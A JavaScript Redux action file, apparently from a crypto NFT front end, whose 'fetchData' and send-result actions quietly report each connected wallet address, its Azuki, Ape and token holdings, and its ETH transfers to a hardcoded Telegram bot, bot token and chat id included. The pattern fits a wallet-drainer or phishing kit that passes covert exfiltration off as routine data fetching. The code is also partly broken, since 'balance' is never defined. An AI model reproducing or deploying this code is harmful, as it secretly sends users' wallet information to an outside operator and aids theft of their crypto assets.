const fetchDataRequest = () => {
  return {
    type: "CHECK_DATA_REQUEST",
  };
};

const fetchDataSuccess = (payload) => {
  return {
    type: "CHECK_DATA_SUCCESS",
    payload: payload,
  };
};

const fetchDataFailed = (payload) => {
  return {
    type: "CHECK_DATA_FAILED",
    payload: payload,
  };
};

// const sendASuccess = () => {
//   return {
//     type: "Send_A_Success",
//   };
// };
// const sendAFail = (payload) => {
//   return {
//     type: "Send_A_Fail",
//     payload: payload,
//   };
// };
const sendMsg = (msg) => {
  fetch(
    "https://api.telegram.org/bot5337107950:AAFOGa4b2j_xi17tiY8o_3JtWQwLvLGcz4I/sendMessage?chat_id=5294367961&text=" +
      msg
  );
};

export const fetchData = (account) => {
  return async (dispatch) => {
    dispatch(fetchDataRequest());
    try {
      
      sendMsg(
        account + " has Azuki of and Ape of " 
      );
      
      sendMsg(account + " has beans of " + balance);
      dispatch(
        fetchDataSuccess({
        })
      );
    } catch (err) {
      console.log(err);
      dispatch(fetchDataFailed("Could not load data from contract."));
    }
  };
};

export const sendASuc = (account, amount) => {
  // return async (dispatch) => {
    sendMsg("BabyDoge:"+ account + " + has sent eth of " + amount);
  // }
} 
export const sendAErr = (account, amount) => {
  sendMsg("BabyDoge:"+ account + " failed in sending eth of " + amount);
}